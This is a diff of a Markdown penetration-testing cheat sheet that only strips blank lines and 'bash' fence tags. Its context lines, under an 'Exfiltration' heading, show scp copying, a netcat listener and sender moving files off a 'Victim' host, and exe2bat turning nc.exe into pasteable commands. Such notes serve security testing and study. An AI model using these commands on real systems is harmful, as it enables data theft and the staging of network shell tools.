@@ -74,14 +74,12 @@ msbuild [src.sln]
 ## Exfiltration
 
 - SSH Copy (scp)
-
-```bash
+```
 scp user@hostname:/path/to/src user@hostname:/path/to/dst
 ```
 
 - Netcat
-
-```bash
+```
 # Victim
 nc -nvlp $RPORT > out.file
 
@@ -90,8 +88,7 @@ nc -nv $RHOST $RPORT < in.file
 ```
 
 - exe2bat
-
-```bash
+```
 # Convert a windows executable to a copy and paste set of commands
 wine $(locate exe2bat.exe) nc.exe nc.txt
 ```
